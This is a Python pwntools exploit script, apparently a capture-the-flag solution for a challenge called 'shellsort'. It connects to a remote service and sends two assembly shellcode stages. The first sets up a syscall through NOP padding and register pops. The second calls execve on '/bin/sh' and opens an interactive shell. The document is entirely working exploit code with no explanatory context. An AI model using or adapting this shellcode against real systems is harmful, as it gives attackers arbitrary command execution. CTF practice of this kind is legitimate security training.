#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'

rem = pwn.remote('csie.ctf.tw', 10121)
#rem = pwn.process('./shellsort')

shellcode1 = pwn.asm('''
    mov edx, 0x90909090
    nop
    nop
    nop
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    pop rsi
    
    pop rbp
    pop rbp
    pop rbp
    pop rbp
    pop rbp
    pop rbp
    pop rbp
    pop rbp
    
    pop rbp
    pop rbp
    pop rbp
    pop rcx
    pop rcx
    pop rcx
    push rbp
    push rsp
    
    xor al, 0x34
    xor al, 0x34
    xor al, 0x34
    xor al, 0x34
    syscall
''')

shellcode2 = pwn.asm('''
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    push rax
    xor rdx, rdx
    xor rsi, rsi
    mov rbx, 0x0068732f6e69622f
    push rbx
    push rsp
    pop rdi
    mov al, 59
    syscall
''')

rem.send(shellcode1)
pwn.sleep(1)
rem.send(shellcode2)
rem.interactive()
